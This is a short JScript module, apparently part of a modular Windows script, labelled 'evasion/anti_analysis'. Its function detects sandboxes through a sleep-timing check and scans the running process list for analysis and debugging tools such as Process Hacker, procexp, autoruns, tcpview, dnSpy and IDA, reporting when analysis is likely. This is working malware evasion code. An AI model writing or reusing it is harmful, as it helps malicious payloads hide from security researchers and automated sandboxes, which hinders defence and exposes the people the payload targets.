// chunk: evasion/anti_analysis
// depends: core/run_cmd
// provides: check_analysis
// format: jscript

function check_analysis() {
    var start = new Date().getTime();
    WScript.Sleep(1500);
    var elapsed = new Date().getTime() - start;
    if (elapsed < 1000) return true;
    var procs = _run("tasklist /fo csv /nh").toLowerCase();
    var analysis = ["processhacker", "procexp", "autoruns", "tcpview", "regmon", "filemon", "apimonitor", "dnspy", "ida"];
    for (var i = 0; i < analysis.length; i++) {
        if (procs.indexOf(analysis[i]) >= 0) return true;
    }
    return false;
}
